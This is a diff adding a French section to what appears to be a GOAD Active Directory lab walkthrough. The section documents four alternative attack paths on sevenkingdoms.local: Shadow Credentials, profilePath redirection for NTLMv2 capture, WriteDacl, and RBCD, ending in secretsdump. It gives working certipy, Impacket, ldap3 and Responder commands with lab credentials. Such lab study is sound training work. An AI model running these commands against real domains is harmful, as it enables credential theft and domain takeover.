@@ -346,6 +346,90 @@ netexec smb 192.168.10.10 -u 'Administrator' -H 'c66d72021a2d4744409969a581a1705
 
 ---
 
+## Techniques alternatives (non exploitées)
+
+Ces techniques couvrent les mêmes étapes de la chaîne mais avec des vecteurs différents — documentées ici pour couverture complète de la Part 11 Mayfly.
+
+### Alt-1 — GenericWrite : Shadow Credentials direct sur joffrey (Étape 2)
+
+Au lieu du Targeted Kerberoasting, `GenericWrite` sur `joffrey.baratheon` peut être exploité via Shadow Credentials si ADCS est actif sur le domaine. Plus furtif : pas de modification de SPN dans les logs.
+
+```bash
+certipy shadow auto -u 'jaime.lannister@sevenkingdoms.local' -p 'P@ssw0rd123!' -account 'joffrey.baratheon' -dc-ip 192.168.10.10
+```
+
+Résultat attendu : TGT + hash NT de `joffrey.baratheon` sans cracking.
+
+> **Pourquoi non utilisé ici :** `sevenkingdoms.local` n'a pas de CA ADCS — PKINIT impossible. Le Targeted Kerberoasting était le seul vecteur viable.
+
+---
+
+### Alt-2 — GenericWrite : profilePath abuse → NTLMv2 capture (Étape 2)
+
+Autre abus de `GenericWrite` : modifier l'attribut `profilePath` de `joffrey.baratheon` pour pointer vers un partage UNC contrôlé. À la prochaine connexion de joffrey, on capture son hash NTLMv2.
+
+```python
+import ldap3
+dn = "CN=joffrey.baratheon,OU=Crownlands,DC=sevenkingdoms,DC=local"
+server = ldap3.Server('192.168.10.10')
+conn = ldap3.Connection(server, user="sevenkingdoms.local\\jaime.lannister", password="P@ssw0rd123!", authentication=ldap3.NTLM)
+conn.bind()
+conn.modify(dn, {'profilePath': [(ldap3.MODIFY_REPLACE, '\\\\192.168.50.X\\share')]})
+print(conn.result)
+conn.unbind()
+```
+
+```bash
+# Capturer le hash NTLMv2 avec Responder
+sudo responder -I eth0 -wv
+```
+
+> **Pourquoi non utilisé ici :** Nécessite une connexion active de joffrey — GOAD a des bots (robb.stark, eddard.stark) mais pas joffrey. Technique couverte en SC-AD-003 (NTLM Relay).
+
+---
+
+### Alt-3 — WriteDacl + Shadow Credentials sur tyron (Étape 3)
+
+Après avoir obtenu `FullControl` sur `tyron.lannister` via WriteDacl, on peut utiliser Shadow Credentials au lieu du password reset — plus discret (pas d'Event ID 4723/4724).
+
+```bash
+# Lire les permissions actuelles
+dacledit.py -action 'read' -principal joffrey.baratheon -target 'tyron.lannister' 'sevenkingdoms.local/joffrey.baratheon:1killerlion'
+
+# Écrire FullControl
+dacledit.py -action 'write' -rights 'FullControl' -principal joffrey.baratheon -target 'tyron.lannister' 'sevenkingdoms.local/joffrey.baratheon:1killerlion'
+
+# Shadow Credentials (ADCS requis)
+certipy shadow auto -u 'joffrey.baratheon@sevenkingdoms.local' -p '1killerlion' -account 'tyron.lannister' -dc-ip 192.168.10.10
+```
+
+> **Pourquoi non utilisé ici :** Pas de CA ADCS sur `sevenkingdoms.local`. Méthode `bloodyAD add genericAll` + password reset utilisée à la place.
+
+---
+
+### Alt-4 — GenericAll sur KINGSLANDING$ : RBCD (Étape 9)
+
+Alternative aux Shadow Credentials : `Resource-Based Constrained Delegation (RBCD)`. On crée un compte machine attaquant, on lui donne les droits de délégation sur `KINGSLANDING$`, puis S4U2Self + S4U2Proxy pour obtenir un TGS Administrator.
+
+```bash
+# Créer un compte machine attaquant
+addcomputer.py 'sevenkingdoms.local/stannis.baratheon:P@ssw0rd123!' -dc-ip 192.168.10.10 -computer-name 'ATTACKER$' -computer-pass 'P@ssw0rd123!'
+
+# Configurer RBCD : ATTACKER$ peut déléguer vers KINGSLANDING$
+rbcd.py -action write -delegate-from 'ATTACKER$' -delegate-to 'KINGSLANDING$' 'sevenkingdoms.local/stannis.baratheon:P@ssw0rd123!' -dc-ip 192.168.10.10
+
+# S4U2Self + S4U2Proxy → TGS Administrator
+getST.py -spn 'cifs/KINGSLANDING.sevenkingdoms.local' 'sevenkingdoms.local/ATTACKER$:P@ssw0rd123!' -impersonate administrator -dc-ip 192.168.10.10
+
+# Utiliser le TGS
+export KRB5CCNAME=administrator.ccache
+secretsdump.py -k -no-pass KINGSLANDING.sevenkingdoms.local -just-dc-ntlm
+```
+
+> **Pourquoi non utilisé ici :** Nécessite le droit d'ajouter des comptes machine au domaine (`ms-DS-MachineAccountQuota > 0`). Shadow Credentials est plus direct et ne requiert pas de compte machine. RBCD est documenté en SC-AD-007 (Kerberos Delegation).
+
+---
+
 ## MITRE ATT&CK Mapping
 
 | Technique | ID | Description |
